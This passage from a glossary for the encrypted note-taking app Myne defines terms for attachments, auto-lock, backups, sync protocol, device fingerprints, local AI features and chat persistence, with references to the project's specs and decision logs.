The 32-byte content-addressed identifier of an [attachment](#attachment): `HMAC-SHA-256(DeriveSubkey(root_key, "attachments-id-hmac"), file_bytes)` (`spec/protocol.md` §9.9). Used as the on-disk filename (hex) and the dedup key — identical content yields one blob within a vault. Because it is keyed under `root_key`, a disk observer without the key cannot test whether the vault holds a specific known file (no confirmation oracle) nor link equal content across vaults (`threat-model.md` AS7/AS8). Notes reference it via the editor form-C embed `![[att:<id>|filename]]`. Dedup is an id-existence check, not convergent encryption. (MYND-164)

### **attachment://** &nbsp; 📋 *Protocol*

The custom WebView protocol scheme that serves a decrypted [attachment](#attachment) to the editor/library. The Rust handler resolves `attachment://<id>`, decrypts the blob in memory, **re-sniffs** the content-type from the bytes and emits only an allowlisted type (`image/*`, `application/pdf`, or `audio/wav` — voice notes, MYND-259), and returns a full response — no plaintext ever written to disk, no `Range`/206 in v0.1. Unlock-gated and main-window-scoped (TB6); the WebView CSP blocks outbound network so a hostile note cannot exfiltrate a blob. (MYND-164)

### **attachment_import** &nbsp; 📋 *Protocol*

The single Tauri command that ingests a file into the attachment store — from inline bytes (clipboard paste / WebView drop) or a path (file picker). Computes the [attachment-id](#attachment-id), performs id-existence dedup, encrypts + stores the [`MYA1`](#mya1) blob, and upserts the [`vault.attachments`](#vaultattachments) metadata; enforces the 64 MiB cap. Since MYND-173 it accepts **any file type** — a file the sniffer does not recognize is stored as `application/octet-stream` (not rejected); the locked reject taxonomy is now oversize / locked (the render allowlist is a serve-time authority on [attachment://](#attachment), not an import gate). Unlock-gated, main-window-scoped. (MYND-164; `decisions.md` 2026-06-14)

### **attachment_export** &nbsp; 📋 *Protocol*

The Tauri command that writes one [attachment](#attachment)'s **decrypted** bytes to a user-chosen destination — the export-only "use" path for a generic file, and the vault-wide Save-As for images/PDF (MYND-173). The frontend opens the native save dialog (the established export-suite convention) and passes the path + overwrite consent; the host decrypts the [`MYA1`](#mya1) blob in Rust memory and writes the plaintext via `atomic_write_unclobbered`, so it never re-enters the WebView. A deliberate user-initiated plaintext crossing of TB3 — exactly the "attachment files" egress already named in `threat-model.md` §3 / §5; it is one-shot and not a plaintext mode. Unlock-gated. See [export](#export). (`decisions.md` 2026-06-14)

### **attachment file-card** &nbsp; 📦 *Product*

The editor representation of a non-renderable (generic) [attachment](#attachment) — a `.docx`, `.zip`, `.txt`, etc. stored as `application/octet-stream`. Unlike an inline image/PDF, the file's content never auto-renders; the form-C embed `![[att:<id>|filename]]` renders as a compact atomic card showing a file-type icon, the [`vault.attachments`](#vaultattachments) filename (the single source of truth — `Rename` edits it globally via `attachment_rename`, not the per-embed alias), a "type · size" line (the type label is derived from the filename extension TS-side, since the catalog stores only `octet-stream`), and a "⋯" overflow menu: Export (→ [attachment_export](#attachment_export)), Rename, Remove from note, Reveal in library. "Using" the file means exporting it. A missing id renders the shared [deleted-attachment tombstone](#deleted-attachment-tombstone). Text-like files (`.txt`/code/`.csv`) and `.docx`/`.xlsx` cards can additionally expand an inline read-only [attachment text preview](#attachment-text-preview) (MYND-268; `.pptx` and the rest stay export-only). (MYND-173; `decisions.md` 2026-06-14)

### **attachment search doc** &nbsp; 📋 *Protocol*

A [search-index](#mys1) document carrying one embedded [attachment](#attachment)'s [extracted text](#attachment-text-extraction) as its **own** result row, keyed `att:<attachment_id_hex>:<note_id>` (`core/src/search/doc_id.rs`) — the MYND-448a separate-doc model that superseded folding attachment text into the embedding note's body doc. The id carries provenance (which attachment, in which note), so an attachment-content hit is badged distinctly ("in attachment") and opens the embedding note. The doc-model generation rides the snapshot's trailing `schema_version` field (`spec/protocol.md` §9.6.2), independent of the [extractor version](#extractor-version) so a model change rebuilds the index without invalidating [`MYE1`](#mye1) caches. Desktop-side only in v0.1; mobile indexes note bodies alone. (MYND-448a; `decisions.md` 2026-07-13)

### **attachment sync-id** &nbsp; 📋 *Protocol*

The **first 16 bytes** of a 32-byte [attachment-id](#attachment-id) — the key under which an [attachment](#attachment) appears in the [vault head](#vault-head) manifest and the sync metadata plane (`spec/sync-protocol.md` §4.2), which use a uniform 16-byte key for notes (UUID) and attachments alike. The full id keeps living in the `attachments/<hex>` filename, the [`vault.attachments`](#vaultattachments) catalog, and the `/attachments/{id}` byte-transport (`spec/server-protocol.md` §3.2); pull sync-meta echoes the full id so a device can resolve the prefix without the catalog. Truncation is safe intra-vault (~2^-64 birthday bound; a collision is a hard manifest encode failure, never silent). Phase 2. (MYND-468)

### **attachment text extraction** &nbsp; 📋 *Protocol*

The on-device extraction of searchable text from an [attachment](#attachment)'s plaintext — PDF text-layer, Word (`.docx`) OOXML text, and text-like files (`.txt`/`.md`/`.csv`) in v0.1 — so a note becomes findable by the contents of the files embedded in it. Extraction runs entirely in the Rust core (no network, no cloud OCR — `vision.md` zero-knowledge), is cached per attachment in an [`MYE1`](#mye1) blob keyed by [attachment-id](#attachment-id), and is indexed into the [search index](#mys1) as a per-embedding-note [attachment search doc](#attachment-search-doc) (MYND-448a — separate docs superseded the original fold-into-note-body; the `MYS1` snapshot records the [extractor version](#extractor-version) and doc-model `schema_version` it was built under — a change in either forces a rebuild; the codec's `index_format_version` byte is unchanged, both ride the engine-opaque inner snapshot). Image OCR and scanned (text-layer-less) PDFs joined this in MYND-441, at [extractor version](#extractor-version) `0x03`: an image attachment is recognized by the bundled on-device [image OCR](#image-ocr) engine, and a PDF whose text layer yields nothing has its embedded page image pulled out and recognized instead. Unlike the audio path, OCR is **not** behind the AI opt-in — it is search correctness, so it ships in every build. (`spec/protocol.md` §9.15; MYND-328)

### **attachment text preview** &nbsp; 📦 *Product*

The inline, read-only expansion of an [attachment file-card](#attachment-file-card) showing the file's decrypted content in the editor — Tier-1 for text-like files (`.txt`/code/`.csv`) via `attachment_read_text`, Tier-2 as a structured render (headings/paragraphs for `.docx`, a sheet grid for `.xlsx`) via `attachment_read_structured`. Both decrypt the [`MYA1`](#mya1) blob in the Rust core and hand the WebView plain text only, rendered via `textContent` (no markup-injection surface) — the text sibling of the [attachment://](#attachment) serve path. Output is size/row-capped; a file the extractors cannot parse falls back to the plain card. Unlock-gated; the EditorHost seam methods are optional, so a host without them (mobile v0.1) keeps the plain card. (MYND-268)

### **AI-excluded folder** &nbsp; 📦 *Product*

A folder the user has excluded from on-device AI ([local inference](#local-inference)): notes inside it (and its subfolders) are never chunked, embedded, summarized, tag-suggested, or offered ghost-text completions. Backed by the additive `ai_excluded_folders` field in the encrypted `vault.prefs` (`MYP1`), canonical trailing-slash folder paths (SYNC-14). Enforced at **both** embed-time (excluded notes are never added to the RAM vector store) and query-time (defense-in-depth), so an excluded note's plaintext never reaches the model. The whole AI surface is additionally gated on the `ai_enabled` pref (default off). See `threat-model.md` §7 "Local AI".

### **auto-lock on idle** &nbsp; 📦 *Product*

A security control that locks the vault after a period of device inactivity, bounding the exposure window of an unattended unlocked Myne (`threat-model.md` A6). A backend-authoritative, fail-closed idle timer fires at a configurable timeout; the lock has two legs — (1) unconditional in-memory key zeroize ("no further notes decryptable"), and (2) best-effort teardown of the decrypted open note (a synchronous OS-level window hide plus a WebView reload). **"Idle" means machine-level** device idle (no input to the whole machine, not merely the Myne window), read per-platform (`GetLastInputInfo` / `CGEventSourceSecondsSinceLastEventType` / `XScreenSaverQueryInfo`); on Wayland, where no portable OS-idle API exists, it falls back to window-level idle as a fail-secure (more-eager) degradation. The timeout preference lives in the encrypted `vault.prefs` blob (`auto_lock_seconds`); the protection itself is always on (see **AUTO_LOCK_CEILING**). Moves A6 from ❌ Out-of-scope to 🔒 Mitigated — deliberately not a 🛡️ Strong guarantee, since freed-page RAM, swap, and hibernation are not scrubbed (A7/A10).

Used in: `threat-model.md` §1 (A6); `decisions.md` 2026-05-30 "Auto-lock on idle"

### **AUTO_LOCK_CEILING** &nbsp; 📦 *Product*

The code-enforced upper bound on the auto-lock timeout — the load-bearing edge of auto-lock's *protective envelope*. The effective timeout is `clamp(vault.prefs value or default, FLOOR?, AUTO_LOCK_CEILING)` and the enabled flag is a code constant, not a preference. Because the ceiling and the always-on flag live in code rather than the replayable `vault.prefs` blob, a disk-level attacker (A4) who replays, deletes, or tampers the preferences file can only make auto-lock *stricter* — never disable it or push it past the ceiling. This is why auto-lock does **not** inherit the local-prefs-replay limitation (`threat-model.md` §7) that best-effort preferences such as the screen-capture toggle do.

Used in: `threat-model.md` §7; `decisions.md` 2026-05-30 "Auto-lock on idle"

### **auto-tag** &nbsp; 📦 *Product*

On-device tag suggestion ([local inference](#local-inference), MYND-651): a **dedicated on-demand task-model** (a small quantized Qwen2 GGUF, fetched from Myne's own artefact origin on explicit user action and verified against a SHA-256 compiled into the client binary, or side-loaded in Developer mode; no longer bundled since myne-md/myne#805, `decisions/ai/0628`) reads the open note a debounce interval after typing settles and proposes a few tags, surfaced in the [tag suggestion band](#tag-suggestion-band). Candidates are open-vocabulary, then folded and ranked against the vault's own [tag index](#tag-index) under the §3.7.8 tag-identity rule — existing tags preferred (solid chips), a genuinely new tag coined only when nothing fits (dashed `+` chip). Accepting writes the tag into the note's frontmatter `tags:` list (idempotent under the fold); suggestions themselves are **RAM-only**, never persisted. Off by default behind its own `auto_tag_enabled` pref (an additive `vault.prefs`/`MYP1` field) *under* the `ai_enabled` beta opt-in, enforced host-side; an [AI-excluded folder](#ai-excluded-folder) short-circuits before any model call. Desktop-only (no Candle on web; mobile deferred to MYND-653). Replaces the earlier command-palette + AI-Chat-tab tag surface (MYND-411). See `decisions.md` 2026-07-31; `threat-model.md` §7 "Local AI".

Used in: `vision.md`; `threat-model.md` §7; `decisions.md` 2026-07-01, 2026-07-31

### **automation debt (manual test roster)** &nbsp; 🛠️ *Tooling*

An observation that was proposed as a manual item and ruled out because an existing or plausible `e2e/`, `e2e-web/`, Vitest or cargo test could honestly assert it. Paying it is the only thing that lowers `totalMinutesCeiling`, so it is the mechanism by which the roster shrinks and the gate widens rather than a backlog of nice-to-haves. Tracked as issues rather than as a file, because a second list beside the roster is the drift the roster exists to stop: myne-md/myne#554 and its four lane sub-issues carry the 265 observations the first derivation ruled out.

Used in: `decisions.md` 2026-08-25 (manual test roster, myne-md/myne#548), myne-md/myne#554

### **backup schedule** &nbsp; 📦 *Product*

The device-local configuration that drives a vault's [scheduled backup](#scheduled-backup) (MYND-351): per-`VaultId` it records `enabled`, the cadence (`every-unlock` / `daily` / `weekly`), the target folder, the retention count N, the written-backup ledger (the prune allowlist), and the per-device status/clock (`last_scheduled_success_at`, `last_backup_attempt_at`, `last_backup_status`). Persisted as best-effort plaintext JSON at `<app_data_dir>/vaults/backup-schedule.json` — a sibling of the `registry.json` cache, modelled on it, and Myne's first persistent device-local *user-setting* store. It deliberately stores plaintext filesystem paths (the target folder + ledger), a recorded departure from `registry.json`'s no-paths discipline — backups are ciphertext, so a known location is not a confidentiality break (`decisions.md` 2026-06-18). The schedule does **not** sync across devices (the target is per-device); its clock is intentionally separate from [last_backup_at](#last_backup_at) (the synced reminder clock).

Used in: `decisions.md` 2026-06-18; `agent-tooling/features/scheduled-local-backup/`

### **backup-key** &nbsp; 🗝️ *Key/identifier*

A subkey context string (`"myne.v0.1 backup-key"`) **reserved but not used in v0.1** (demoted 2026-06-10; the entry previously claimed it encrypts exported backup files). The v0.1 [vault backup file](#vault-backup-file) is a verbatim ciphertext copy with no outer encryption layer; the demotion rationale lives in the §3.4 registry row and `decisions.md` 2026-06-10. Retained, like `server-auth`, so the context string stays allocated for a potential future sealed-backup variant. **Unrelated to [built-in backup](#built-in-backup)** — that is the operator's restic repository, not a Myne subkey.

### **built-in backup** &nbsp; 📦 *Product*

The Phase 2 sync server's **server-native** encrypted off-box backup (`decisions.md` 2026-07-14; MYND-505): when the operator sets `MYNE_BACKUP_*` (repository, password file, interval), [`myne-server`](#blind-blob-store) drives a **bundled restic** to snapshot its own fs store to an off-box target on a schedule, pruned to a disclosed retention window (default 14 days). **Disabled by default**; enabling requires the fs backend + a repository + a password file. Hosted and self-host use the **same mechanism** (TB5 parity) — a self-hoster gets the same durability with no separate tooling. Confidentiality is unchanged: blobs are already client-encrypted and the server holds no `root_key`, so restic's encryption's load-bearing job is protecting `auth.json` and bounding how long a deleted blob survives off-box (`threat-model.md` §7). Distinct from **[backup-key](#backup-key)** (a reserved client subkey for a future sealed-backup variant) and the client **[vault backup file](#vault-backup-file)** (`.myne-backup`, a device-side whole-vault export) — a different actor (the operator) and a different asset (already-encrypted server ciphertext).

Used in: `decisions.md` 2026-07-14; `self-host-policy.md` §4

Used in: `spec/protocol.md` §3.4, §9.11; `decisions.md` 2026-06-10

### **base import** &nbsp; 📦 *Product*

A one-way, **accepted-lossy** adapter that reads an Obsidian *Bases* `.base` file (plain YAML describing views over the user's own notes) and maps the representable subset onto Myne's canonical [saved view](#saved-view) schema (Saved Views epic, MYND-276). It is **import-only** in v1 (export is the future MYND-279) and a derived bridge — Myne does **not** own or round-trip the `.base` format. Unsupported filter clauses (anything outside the closed [filter AST](#filter-ast) allow-list — `list.map`/arithmetic/`file.hasLink`/`file.mtime`), and the `formulas` / `summaries` / `properties`-display blocks, are **dropped and counted** (no formula/code-eval exists to honor them — the no-database/no-formula commitment of [vision](#vision)); a clause-level warning tally surfaces exactly what came across and what didn't (SYNC-12). Obsidian's recursive `file.inFolder()` matches Myne's subtree-inclusive engine leaf, so that mapping is direct. The reader reuses the vendored YAML parser + the shipped importer file seam (no new dependency / capability), parses in RAM only (PS-1), and persists into the existing `vault.prefs` (`MYP1`) `saved_views` field (no new crypto). The "Bases" / "Obsidian" names are used **nominatively** only (what the importer reads), never as a productized Myne feature name.

Used in: `decisions.md` 2026-06-15; Saved Views (MYND-276)

### **bootstrap fingerprint** &nbsp; 🗝 *Key/identifier*

The SHA-256 fingerprint of a newly-enrolled device's **public key**, shown as a short SAS string on both the approving device and the enrolling one for the user to compare out loud. It is the [device-approval gate](#device-approval-gate)'s answer to a malicious server: a server holding a user's password can approve a device whose key it also controls, and the SAS is the one thing a server cannot fabricate, because each side derives it from the public key it is about to trust. **It is not a certificate fingerprint.** Up to 2026-09-28 the product also asked the user to read a server certificate's fingerprint and confirm it matched the first connection (`decisions/sync/0246`); that compare is retired, and the server's certificate is now verified against bundled public CA roots by every client instead ([in-transit encryption](#in-transit-encryption)). Keeping the two apart matters, because the second was a check whose expected value the user had to receive out of band — only ever as good as that channel — while the first is a comparison of two values the devices exchange live. No third fingerprint may be added without a decision that says why a CA-verified chain is not enough.

Used in: `decisions/sync/0431`, `decisions/security/0493`; `spec/sync-protocol.md` §11

### **bidirectional links** &nbsp; 📦 *Product*

*(Aliases: backlinks, wikilinks.)*

Links between notes that are queryable from both endpoints — opening a note shows which other notes link to it. Myne supports the `[[wikilink]]` syntax in v0.1 with a [Links tab](#links-tab) answering both directions; the graph view (d3-force + hand-rolled render) is also part of v1.0 scope (`vision.md` Phase 1 Scope).

Used in: `vision.md` Phase 1 Scope

### **block anchor** &nbsp; 📦 *Product*

An Obsidian-style `^block-id` marker at the end of a line, addressable from a [wikilink](#bidirectional-links) as `[[Note^block-id]]`. Myne is **enumerate-only** about them (MYND-382): the `[[^^` picker mode lists, vault-wide, the anchors that already exist (e.g. imported from Obsidian) via the imported block-anchor records persisted in [`vault.indices`](#myi1) (`spec/protocol.md` §9.8.2), and emitting a link never mints a marker — note bytes are never rewritten to create one. Distinct from the `[[#`/`[[##` heading picker modes, which address document structure rather than an explicit marker. (`decisions.md` 2026-07-13)

### **birth format** &nbsp; 📋 *Protocol*

The major protocol version a **newly created** vault is written in — as of `decisions.md` 2026-08-13, **v0.2** (`NTV5` `vault.meta`, [`NC05`](#nc05) notes, `MY?5` singletons). Named separately from "current version" because the two are not the same thing: v0.1 stays fully **readable** (it is what a [cross-major migration](#migration-cross-major) reads *from*, and pre-flip vaults keep working unmigrated) while no client **produces** it any more. Pinned normatively in `spec/protocol.md` §10.3.1 and carried in code by the single constant `vault_creation::BIRTH_GENERATION`.

Changing it is a fleet event, not a client-local choice: §10.5's anti-downgrade refusal means a client without v0.2 read support refuses an `NTV5` vault outright, so every supported client needs read support before — or in the same release as — the flip.

Used in: `spec/protocol.md` §10.3.1

### **bookmark note** &nbsp; 📦 *Product*

A content-light `.myn` note created by the [browser clipper](#browser-clipper) holding a source URL (bare autolink) + title + `source:` / `clipped:` frontmatter; no page body. Participates in tags / backlinks / graph / saved views as an ordinary note. Re-clipping a URL creates an independent note (no dedup detection in v1).

Used in: `browser-extension` epic, MYND-447

### **B2B rekey** &nbsp; 🗝️ *Key/identifier*

The `itemsKey` rotation a member removal triggers (`myne-md/myne#698`,
`design-notes/protocol/0592`). `root_key` is untouched: every per-note
`item_key` and every attachment `attachment_key` sits under the singleton
`itemsKey`, so minting a fresh one re-keys all content in one step, the
Bitwarden content-encryption-key pattern. Per blob the content ciphertext is
**byte-identical** (re-encrypting it would author an edit into every note's
Automerge change-graph and churn every attachment), the `enc_item_key` wrap is
rewritten under the new key, and `items_key_id` **stays** because the content
AAD binds it. The new `itemsKey` is then wrapped to every remaining member
([per-recipient wrap](#per-recipient-wrap)) and the removed member's row is
tombstoned (see [vault roster](#vault-roster)). A removed member keeps what
they synced before the rotation; anything pushed after it is closed to them.
Distinct from the whole-vault **format migration** (`spec/protocol.md` §10.4),
which re-keys `root_key` and re-encrypts every blob.

Used in: `design-notes/protocol/0592`; `myne-md/myne#698`.

### **BIP-39** &nbsp; 🏗️ *Construction* (deep entry, *Myne-divergent*)

*(Aliases: mnemonic phrase encoding. Myne-divergent: yes — encoding only.)*

Bitcoin Improvement Proposal 39, defining a mapping from random entropy to a sequence of human-friendly English words plus a checksum. **Myne uses BIP-39 only as an encoding** for 256-bit recovery phrases — the 24 words present, capture, and re-enter 256 bits of secret entropy plus an 8-bit checksum. Myne does **not** use BIP-39's standard PBKDF2-HMAC-SHA512 with 2048 iterations to derive a wallet seed; that derivation is too weak by 2026 cryptographic standards. Instead, the normalized phrase string is fed directly to Argon2id with the protocol's standard parameters to derive `recovery_wrap_key` (`spec/protocol.md` §7.1). This divergence is intentional and load-bearing for the recovery-phrase security argument.

Used in: `spec/protocol.md` §7
Reference: https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki

### **bootstrap-fingerprint** &nbsp; 📋 *Protocol*

A short, eye-comparable code derived from a [vault head](#vault-head)'s [head_id](#head_id), compared **out-of-band** between two devices at the device-approval moment to harden the [TOFU bootstrap](#tofu-bootstrap) of a newly-enrolled device against a malicious server — the same role as Signal/Matrix safety numbers. A fresh device has no prior head to compare against, so its first adopted state would otherwise be taken on faith; the user eye-comparing the fingerprint on both screens turns "trust the server" into "verified against an existing trusted device". Exactly **40 bits**, not the full 32-byte `head_id`: `SHA-256("myne.v0.1 vault-head-fingerprint" || head_id)` truncated to its first 5 bytes and rendered as eight Crockford-base32 characters, displayed grouped `XXXX-XXXX`. Every element of that construction is normative and cross-implementation byte-identical (`spec/sync-protocol.md` §6.3, pinned by the `head-fingerprint` golden vectors) — a second implementation that changed the domain string, the truncation width, the bit order, the alphabet or the grouping would show a different code for the same head. There is **no** check character: this code is compared by eye, never typed, so the Damm-32 machinery of `account-number.md` §4 does not apply. v1 ships the substrate (the fingerprint is a deterministic function of `head_id`); the general always-available fork-audit fingerprint UI is v1.x. Phase 2.

Used in: `spec/sync-protocol.md` §6.3 (normative construction); `spec/protocol.md` §3.4 (MYND-416); `protocol/src/vault_head.rs::head_fingerprint`

### **batch blob fetch** &nbsp; 📋 *Protocol*

`POST /sync/blobs` — the read-path twin of the chunked push: up to a fixed id cap of a pull's changed ciphertexts in ONE request instead of one `GET /sync/blob` each (`server-protocol.md` §3.3). The client plans each **window** against both an id count and a byte budget estimated from the advisory `size` of the [per-blob sync-meta](#per-blob-sync-meta); because that `size` is server-advertised and untrusted, the window is a hint that can only cost a round-trip, never produce a wrong result. The response accounts for a **prefix** of the request in order: an id in neither the served array nor the `omitted` array was simply not served, and the client re-requests it. Every omission carries a per-id code, so a [reclaimed blob](#blob-reclaimed) is reported by absence-plus-code and **never** as an entry with empty bytes — the §11.3 fail-closed rule, restated for a shape that can violate it by dropping an id rather than by serving a zero-length body. A server predating the route answers `404`/`405` and the client falls back to the single-blob route for that sync attempt; a transport failure is an outage, not that signal. A batch spends tokens in proportion to the ids it carries (`server-protocol.md` §5.2), so it buys round-trips rather than budget. Phase 2.

Used in: `spec/server-protocol.md` §3.3, §5.2; `spec/sync-protocol.md` §8.1, §11.3

### **blind blob store** &nbsp; 📦 *Product*

The Phase 2 sync server's role: it stores **opaque ciphertext blobs and key-wrapping material only**, and performs **structural** operations on them — current-head pointer compare-and-swap, the per-note version-counter increment, quota accounting — but **never** decrypts, merges, or interprets content (A1; TB5). Plaintext, decryption keys, and the master password never leave the client. Conflict resolution is consequently client-side (`sync-protocol.md` §10). "Blind" = the server is structurally incapable of reading what it relays; self-hosted and hosted operators are identical in this respect (TB5). Phase 2.

Used in: `spec/server-protocol.md` §1–§2

### **blob reclaimed** &nbsp; 📋 *Protocol*

The Layer-2 storage-reclamation outcome (`sync-protocol.md` §11.3): past the tombstone horizon the server dropped a record's ciphertext body and kept only `(uuid, final_version, marker)` — so the record exists and its bytes do not. A ciphertext fetch for one **fails closed**: `410 blob_reclaimed` on the single-blob route, or a per-id `blob_reclaimed` omission on a [batch blob fetch](#batch-blob-fetch). Never an empty-body `200` and never an entry with empty bytes — a blind client cannot tell a zero-length ciphertext from a real one, and this was observed destroying live local notes. Distinct from `not_found`, which says nothing at all: `blob_reclaimed` says the uuid once existed and was reclaimed, so the client drops or quarantines the record rather than re-pushing it (re-pushing would resurrect deleted content and lose the reclaimed version's CAS). Client dispositions: skip without mutation in the pull loop, [quarantine](#sync-quarantine) on the fresh-cursor probe. Phase 2.

Used in: `spec/sync-protocol.md` §11.3; `spec/server-protocol.md` §3.3, §7.2

### **bottom bar** &nbsp; 📦 *Product*

The 28px status bar pinned to the bottom of the editor (`BottomBar`, `src/screens/Editor.tsx`). Hosts the connection/sync status text, the [save-status](#optimistic-ui-rollback) badge, and the persistent affordances for the [tag browser](#tag-browser), Saved Views, the whole-vault graph, Settings, vault Lock, and the live document-statistics readout (characters / words / spaces / paragraphs — selection-scoped when a non-empty selection exists, the full breakdown in its hover title; MYND-339, reusing the `word-count` item id). **Bottom-bar customization** (2026-06-15) lets the user hide/show each item via a right-click context menu; the hidden set persists per-vault in the `vault.prefs` `hidden_bar_items` field (set semantics, omitted-when-empty — a fully-visible bar is byte-identical to a pre-feature vault). The bar root stays right-clickable even when fully emptied, which is the only restore path (no Settings-panel mirror). There is deliberately **no** separate top bar — the top controls float into the OS title-bar row (MYND-166).

Used in: `decisions.md` 2026-06-15 "Bottom-bar customization"; `spec/protocol.md` §9.5.2 (`hidden_bar_items`)

### **bounded heat** &nbsp; 📦 *Product*

The knowledge-graph layout's run posture after 2026-09-21: the force simulation runs while it has energy, cools by alpha decay, and **stops on its own** once it has settled and gone idle, and an interaction (a node drag, a force-slider change, a filter that changes the node set) **re-heats** it under a bound. It replaces the earlier "run a fixed budget of ticks, then stop permanently" contract, and the distinction a reader must carry is that it is **not** a perpetual animation loop: the idle stop is the load-bearing half, and it is what makes a live graph affordable rather than a panel that quietly burns a CPU core. Named because the properties it replaces and the failure it prevents are both referenced from code and from the decision log.

Used in: `decisions.md` 2026-09-21 "Graph layout runs live and stops itself"

### **BLAKE3** &nbsp; 🔐 *Primitive*

A modern hash function and KDF with strong parallelism characteristics. **Not used in Myne v0.1** — researched as an alternative to HKDF-SHA-256 for subkey derivation but rejected (Deferred #2 in `decisions.md`) in favor of HKDF-SHA-256 for libsodium compatibility, MLS alignment with a later major version, and a smaller dependency surface. The "structural context binding" advantage that BLAKE3 `derive_key` offers is recovered at the codebase level by Myne's single-canonical-helper pattern (§3.2.1).

Used in: `decisions.md` (Deferred #2 rationale)
Reference: https://github.com/C2SP/C2SP/blob/main/BLAKE3.md

### **browser clipper** &nbsp; 📦 *Product*

*(Alias: clipper extension.)*

Myne's **keyless** browser extension (`browser-extension` epic, MYND-442) that captures a web article / selection or a page URL, converts it to **markdown in the page**, and hands it to the desktop core over a [native-messaging host](#native-messaging-host) bridge to be encrypted into the vault. The desktop — not the extension — canonicalizes that markdown to exact [D1](#myne-markdown-dialect-d1) via the [clip serializer](#clip-serializer) (MYND-444: dialect-emit dependencies stay out of the hostile browser runtime, a TB10 boundary property). Holds no key; runs outside TB2; saves to the vault root with no capture-time folder/tag selection; never reads or decrypts the vault. Ships in the separate `myne-clipper` companion repo.

Used in: `browser-extension` epic, MYND-442

### **bug bounty** &nbsp; 🛠️ *Tooling*

A public-facing page listing known security reports and their resolution status, plus a mechanism to receive new reports. Cash payouts are not required at v0.1; acknowledgment-only is acceptable per the compensating-controls plan in `threat-model.md` §6.

Used in: `threat-model.md` §6

### **cargo-vet / cargo-audit** &nbsp; 🛠️ *Tooling*

Rust-ecosystem tools for auditing transitive Cargo dependencies for known vulnerabilities (cargo-audit) and for crowd-sourced trust attestations (cargo-vet). With the Tauri/Rust stack decision, these are part of Myne's supply-chain defense (`threat-model.md` §7).

Used in: `threat-model.md` §7

### **Candle** &nbsp; 🛠️ *Tooling*

The minimalist pure-Rust ML framework (`candle-core` / `candle-nn` / `candle-transformers`, from Hugging Face) Myne uses to run [local inference](#local-inference) on CPU — quantized GGUF generation + BERT embeddings. Added with `default-features = false`, so the model-download crate families (`hf-hub` / `http`) never enter the tree (models are side-loaded, SYNC-1/2). It **ships in the default build** as of `decisions.md` 2026-07-02 (the `local-inference` feature moved into `default`); the zero-ML-symbol auditable binary is now the `--no-default-features` build rather than the default. The largest single third-party surface Myne takes; no-egress is enforced as an absolute property of the shipped tree by a CI denylist gate.

### **ChaCha20-Poly1305** &nbsp; 🔐 *Primitive*

The IETF AEAD specified in RFC 8439, using the ChaCha20 stream cipher and the Poly1305 MAC with a 96-bit nonce. **Not directly used in Myne** — the protocol uses the *extended-nonce* variant XChaCha20-Poly1305 (192-bit nonce) wherever AEAD is invoked. Plain ChaCha20-Poly1305 is referenced only when distinguishing the two; readers must not conflate them.

Used in: `spec/protocol.md` §5.1
Reference: RFC 8439.

### **catalog sync-id** &nbsp; 📋 *Protocol*

The reserved 16-byte sync-plane identifier of the [`vault.attachments`](#vaultattachments) catalog under Phase 2 sync: `DeriveSubkey(root_key, "catalog-sync-id")[0..16]` (`spec/protocol.md` §3.4; MYND-468). The catalog is a synced singleton **outside** the head manifest (`spec/sync-protocol.md` §4.2), so it needs a stable blob-id every device derives identically; because the id is `root_key`-keyed pseudorandom bytes, the server cannot distinguish the catalog's record from a note's. Derives an *identifier*, not key material — the catalog KEK stays `attachments-catalog-key`. Excluded from the manifest by construction. Phase 2.

### **characterisation test** &nbsp; 🛠️ *Tooling*

A test whose assertions pin the code's **current** behaviour rather than the behaviour the code should have. See [ignored invariant test](#ignored-invariant-test) for the three shapes this belongs to and when each is the right one; the short form is that a characterisation test is **green while the defect lives**, so one that ships states that the defect is correct.

Used in: `design-notes/security/0614-unfixed-security-findings-ship-as-ignored-invariant-tests.md`; myne-md/myne#750

### **chat turn** &nbsp; 📦 *Product*

One settled message in a [conversation](#conversation): a `text` turn (the ask flow's question and the model's streamed answer) or an `agent` turn (a run's task, and its frozen counts + finish summary + proposal). Turns are immutable once settled: the write path is **append-at-finalize** (a turn persists the moment its stream closes, its run settles, or it fails, including the partial text of a stream interrupted by a lock), and nothing rewrites a turn in place (`protocol.md` §9.24.2). Turn ids are monotonic per client and embed a client discriminator, which is what makes the concurrent-append sync merge deterministic.

Used in: `protocol.md` §9.24.2; `decisions/ai/0581`

### **chord** &nbsp; 📦 *Product*

A single keyboard-shortcut combination, e.g. `Mod-Shift-g` (hotkeys epic, MYND-304). Myne's canonical chord string is CodeMirror-`KeyBinding.key`-compatible: a `-`-separated sequence of modifier tokens followed by one logical key, using the cross-platform `Mod` token (Cmd on macOS, Ctrl elsewhere) and the layout-respecting *logical* key (what the user sees on the key, not the physical `code`); single-character keys are lowercased. Stored NFC-normalized inside `vault.prefs` (the `keymap` field). See **keymap**, **key binding**.

Used in: `spec/protocol.md` §9.5.2

### **conversation** &nbsp; 📦 *Product*

*(Alias: AI chat, chat thread.)*

One persisted AI chat history unit: an ordered, immutable list of settled [chat turns](#chat-turn) plus a record (id, title, created/updated timestamps, causal version, tombstone) in the [conversation catalog](#conversation-catalog). Conversations survive lock, restart and device changes (encrypted at rest as `MYJ1` files under `chats/`, synced, backed up), are listed by updated-at, continue from where the last one left off when the AI tab opens, and delete everywhere via a catalog tombstone with no trash or undo (`decisions/ai/0581`). Titles derive deterministically from the first user turn (first 48 Unicode scalar values, newlines stripped, no model call) and are user-renameable. An agent turn's frozen [proposal](#agent-run) persists inside its conversation **read-only**: no historical re-apply exists (`decisions/ai/0583`).

Used in: `protocol.md` §9.23/§9.24; `decisions/ai/0581`, `decisions/ai/0583`

### **conversation catalog** &nbsp; 📦 *Product*

*(Alias: `vault.chats`, chats catalog.)*

The singleton roster blob (`MYM1`, `protocol.md` §9.23) enumerating the vault's [conversations](#conversation): one entry per conversation id carrying title, timestamps, the causal `version` the sync merge races on, and the deletion tombstone. The pair half of the per-conversation `MYJ1` files (the `vault.attachments`/`attachments/` archetype): the catalog is what syncs as one addressed singleton, the files are what a deletion removes. Read semantic is **report-don't-empty** (a corrupt catalog surfaces an error; it is never read as empty and rewritten, because that would persist emptiness over real records, `decisions/ai/0581`).

Used in: `protocol.md` §9.23; `decisions/ai/0581`

### **CLI-excluded folder** &nbsp; 📦 *Product*

*(Alias: `cli_excluded_folders`.)*

